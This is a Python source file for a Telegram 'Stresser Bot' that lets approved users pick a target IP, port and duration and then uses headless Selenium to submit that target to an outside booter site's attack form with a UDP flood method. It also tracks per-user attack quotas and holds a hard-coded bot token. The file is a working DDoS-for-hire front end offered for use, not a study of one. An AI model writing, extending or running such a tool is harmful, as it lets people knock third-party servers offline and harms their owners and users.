import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import asyncio

# ==================== CONFIGURATION ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8546917231:AAHW7JMpdFOkcCQm_I_bBKfAZZhY2UETnes"  # Apna token daalein
ADMIN_IDS = [7820814565]  # Admin IDs
WEBSITE_URL = "https://satellitestress.st/attack"  # Target website

# ==================== DATA FILES ====================
USERS_FILE = "users.json"
ATTACKS_FILE = "attacks.json"
SETTINGS_FILE = "settings.json"

# ==================== DATA LOAD/SAVE FUNCTIONS ====================
def load_data():
    """Load all data from files"""
    default_settings = {
        "cooldown": 40,
        "max_attacks_per_user": 10,
        "maintenance_mode": False,
        "max_duration": 300,
        "allowed_ports": [1, 65535]
    }
    
    try:
        with open(USERS_FILE, 'r') as f:
            users = json.load(f)
    except:
        users = {"approved": [], "admins": ADMIN_IDS, "banned": []}
    
    try:
        with open(ATTACKS_FILE, 'r') as f:
            attacks = json.load(f)
    except:
        attacks = {"current": None, "history": [], "user_counts": {}}
    
    try:
        with open(SETTINGS_FILE, 'r') as f:
            settings = json.load(f)
    except:
        settings = default_settings
        save_settings(settings)
    
    return users, attacks, settings

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def save_attacks(attacks):
    with open(ATTACKS_FILE, 'w') as f:
        json.dump(attacks, f, indent=2)

def save_settings(settings):
    with open(SETTINGS_FILE, 'w') as f:
        json.dump(settings, f, indent=2)

# Load all data
users, attacks, settings = load_data()

# ==================== HELPER FUNCTIONS ====================
def is_admin(user_id):
    return user_id in users.get("admins", [])

def is_approved(user_id):
    return user_id in users.get("approved", [])

def can_attack(user_id):
    return (is_admin(user_id) or is_approved(user_id)) and not settings.get("maintenance_mode", False)

def get_remaining_attacks(user_id):
    user_counts = attacks.get("user_counts", {})
    used = user_counts.get(str(user_id), 0)
    max_allowed = settings.get("max_attacks_per_user", 10)
    return max(0, max_allowed - used)

def update_attack_count(user_id):
    user_counts = attacks.get("user_counts", {})
    user_counts[str(user_id)] = user_counts.get(str(user_id), 0) + 1
    attacks["user_counts"] = user_counts
    save_attacks(attacks)

def is_valid_ip(ip):
    """Validate IP address"""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except:
            return False
    return True

def is_valid_port(port):
    """Validate port number"""
    try:
        p = int(port)
        min_port, max_port = settings.get("allowed_ports", [1, 65535])
        return min_port <= p <= max_port
    except:
        return False

# ==================== SELENIUM ATTACK FUNCTION ====================
def launch_website_attack(ip, port, duration):
    """
    Launch attack using Selenium to automate website form
    """
    driver = None
    try:
        # Setup Chrome options
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')  # Background mode
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        
        # Initialize driver
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        
        # Open website
        logger.info(f"Opening website: {WEBSITE_URL}")
        driver.get(WEBSITE_URL)
        
        # Wait for page to load
        wait = WebDriverWait(driver, 10)
        
        # Find and fill IP field
        ip_field = wait.until(EC.presence_of_element_located((By.NAME, "ip")))
        ip_field.clear()
        ip_field.send_keys(ip)
        
        # Find and fill Port field
        port_field = driver.find_element(By.NAME, "port")
        port_field.clear()
        port_field.send_keys(str(port))
        
        # Find and fill Duration field
        duration_field = driver.find_element(By.NAME, "duration")
        duration_field.clear()
        duration_field.send_keys(str(duration))
        
        # Select UDP method if needed
        try:
            method_select = driver.find_element(By.NAME, "method")
            method_select.send_keys("UDP-FREE")
        except:
            pass
        
        # Find and click Launch button
        launch_button = driver.find_element(By.XPATH, "//button[contains(text(), 'Launch')]")
        launch_button.click()
        
        logger.info(f"✅ Attack launched: {ip}:{port} for {duration}s")
        
        # Wait a bit to ensure attack starts
        time.sleep(3)
        
        return True, "Attack launched successfully!"
        
    except Exception as e:
        logger.error(f"❌ Attack failed: {e}")
        return False, str(e)
        
    finally:
        if driver:
            driver.quit()

# ==================== TELEGRAM BOT HANDLERS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler"""
    user_id = update.effective_user.id
    
    # Check maintenance mode
    if settings.get("maintenance_mode", False) and not is_admin(user_id):
        await update.message.reply_text("🔧 **MAINTENANCE MODE**\nBot is under maintenance. Please wait.")
        return
    
    # Check if user is approved
    if not (is_admin(user_id) or is_approved(user_id)):
        # Request access
        await update.message.reply_text(
            "🚫 **ACCESS DENIED**\n\n"
            f"Your ID: `{user_id}`\n\n"
            "Please contact admin for access.\n"
            "Admin: @your_admin_username"
        )
        return
    
    # Show main menu
    remaining = get_remaining_attacks(user_id)
    
    keyboard = [
        [KeyboardButton("🎯 Launch Attack"), KeyboardButton("📊 Status")],
        [KeyboardButton("🔐 My Stats"), KeyboardButton("❓ Help")]
    ]
    
    if is_admin(user_id):
        keyboard.append([KeyboardButton("⚙️ Admin Panel")])
    
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        f"🤖 **WELCOME TO STRESSER BOT**\n\n"
        f"🎯 Remaining Attacks: {remaining}\n"
        f"📊 Status: {'🟢 Online' if not settings['maintenance_mode'] else '🔴 Maintenance'}\n\n"
        f"Use buttons below to navigate:",
        reply_markup=reply_markup
    )

async def attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start attack process"""
    user_id = update.effective_user.id
    
    if not can_attack(user_id):
        await update.message.reply_text("🚫 You don't have permission to attack.")
        return
    
    remaining = get_remaining_attacks(user_id)
    if remaining <= 0:
        await update.message.reply_text("❌ You've used all your attacks. Contact admin for more.")
        return
    
    # Check if attack already running
    if attacks.get("current") is not None:
        await update.message.reply_text("⚠️ Another attack is already running. Please wait.")
        return
    
    # Ask for IP
    context.user_data["attack_step"] = "waiting_for_ip"
    
    keyboard = [[KeyboardButton("❌ Cancel")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🎯 **LAUNCH ATTACK**\n\n"
        "Step 1/3: Send target IP address\n"
        "Example: `192.168.1.1`",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    user_id = update.effective_user.id
    text = update.message.text
    
    # Handle cancel
    if text == "❌ Cancel":
        context.user_data.clear()
        await start(update, context)
        return
    
    # Handle main menu buttons
    if text == "🎯 Launch Attack":
        await attack_start(update, context)
        return
    
    elif text == "📊 Status":
        if attacks.get("current"):
            attack = attacks["current"]
            await update.message.reply_text(
                f"🔥 **ATTACK RUNNING**\n\n"
                f"Target: `{attack['ip']}:{attack['port']}`\n"
                f"Started: {attack['start_time']}\n"
                f"Duration: {attack['duration']}s"
            )
        else:
            await update.message.reply_text("✅ No attack running. Ready to launch!")
        return
    
    elif text == "🔐 My Stats":
        remaining = get_remaining_attacks(user_id)
        total_used = attacks.get("user_counts", {}).get(str(user_id), 0)
        await update.message.reply_text(
            f"📊 **YOUR STATS**\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"✅ Status: {'Approved' if is_approved(user_id) else 'Admin'}\n"
            f"🎯 Attacks Used: {total_used}\n"
            f"🎯 Remaining: {remaining}\n"
            f"🎯 Max Allowed: {settings.get('max_attacks_per_user', 10)}"
        )
        return
    
    elif text == "❓ Help":
        help_text = (
            "🆘 **HELP**\n\n"
            "**Commands:**\n"
            "• Launch Attack - Start new attack\n"
            "• Status - Check current attack\n"
            "• My Stats - View your stats\n"
            "• Help - Show this message\n\n"
            "**How to attack:**\n"
            "1. Click Launch Attack\n"
            "2. Enter target IP\n"
            "3. Enter port number\n"
            "4. Enter duration (seconds)\n\n"
            "**Limits:**\n"
            f"• Max Duration: {settings.get('max_duration', 300)}s\n"
            f"• Max Attacks: {settings.get('max_attacks_per_user', 10)}\n\n"
            "Contact admin for support."
        )
        await update.message.reply_text(help_text)
        return
    
    elif text == "⚙️ Admin Panel" and is_admin(user_id):
        keyboard = [
            [KeyboardButton("➕ Add User"), KeyboardButton("➖ Remove User")],
            [KeyboardButton("📋 Users List"), KeyboardButton("🔧 Settings")],
            [KeyboardButton("📊 System Stats"), KeyboardButton("« Back")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text("⚙️ **ADMIN PANEL**", reply_markup=reply_markup)
        return
    
    elif text == "« Back":
        await start(update, context)
        return
    
    # Handle attack steps
    if "attack_step" in context.user_data:
        step = context.user_data["attack_step"]
        
        if step == "waiting_for_ip":
            if is_valid_ip(text):
                context.user_data["attack_ip"] = text
                context.user_data["attack_step"] = "waiting_for_port"
                await update.message.reply_text(
                    f"✅ IP: `{text}`\n\n"
                    "Step 2/3: Send target port\n"
                    "Example: `80`"
                )
            else:
                await update.message.reply_text("❌ Invalid IP. Please send valid IP:")
        
        elif step == "waiting_for_port":
            if is_valid_port(text):
                port = int(text)
                context.user_data["attack_port"] = port
                context.user_data["attack_step"] = "waiting_for_duration"
                
                # Show duration options
                keyboard = [
                    [InlineKeyboardButton("30s", callback_data="dur_30"),
                     InlineKeyboardButton("60s", callback_data="dur_60"),
                     InlineKeyboardButton("120s", callback_data="dur_120")],
                    [InlineKeyboardButton("180s", callback_data="dur_180"),
                     InlineKeyboardButton("240s", callback_data="dur_240"),
                     InlineKeyboardButton("300s", callback_data="dur_300")],
                    [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await update.message.reply_text(
                    f"✅ IP: `{context.user_data['attack_ip']}`\n"
                    f"✅ Port: `{port}`\n\n"
                    "Step 3/3: Select attack duration:",
                    reply_markup=reply_markup
                )
            else:
                min_port, max_port = settings.get("allowed_ports", [1, 65535])
                await update.message.reply_text(
                    f"❌ Invalid port. Use {min_port}-{max_port}:"
                )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline button callbacks"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if query.data == "cancel":
        context.user_data.clear()
        await query.message.delete()
        await start(update, context)
        return
    
    if query.data.startswith("dur_"):
        duration = int(query.data.split("_")[1])
        
        if "attack_ip" not in context.user_data or "attack_port" not in context.user_data:
            await query.message.edit_text("❌ Session expired. Start again.")
            return
        
        ip = context.user_data["attack_ip"]
        port = context.user_data["attack_port"]
        
        # Clear user data
        context.user_data.clear()
        
        # Update attack tracking
        attacks["current"] = {
            "ip": ip,
            "port": port,
            "duration": duration,
            "start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "user_id": user_id
        }
        save_attacks(attacks)
        
        await query.message.edit_text(
            f"🔄 **LAUNCHING ATTACK...**\n\n"
            f"Target: `{ip}:{port}`\n"
            f"Duration: {duration}s\n\n"
            f"Please wait..."
        )
        
        # Run attack in thread
        def run_attack():
            success, message = launch_website_attack(ip, port, duration)
            
            # Update attack counts
            if success:
                update_attack_count(user_id)
            
            # Clear current attack
            attacks["current"] = None
            save_attacks(attacks)
            
            # Schedule response
            asyncio.run_coroutine_threadsafe(
                send_attack_result(query.message.chat_id, success, message, ip, port, duration, context),
                context.application.loop
            )
        
        thread = threading.Thread(target=run_attack)
        thread.start()

async def send_attack_result(chat_id, success, message, ip, port, duration, context):
    """Send attack result message"""
    if success:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"✅ **ATTACK COMPLETED!**\n\n"
                 f"Target: `{ip}:{port}`\n"
                 f"Duration: {duration}s\n"
                 f"Status: Successful"
        )
    else:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ **ATTACK FAILED**\n\n"
                 f"Error: {message}\n\n"
                 f"Please try again or contact admin."
        )

def main():
    """Main function"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 BOT STARTED SUCCESSFULLY!")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"🌐 Target Website: {WEBSITE_URL}")
    print(f"🎯 Max Attacks: {settings.get('max_attacks_per_user', 10)}")
    
    application.run_polling()

if __name__ == "__main__":
    main()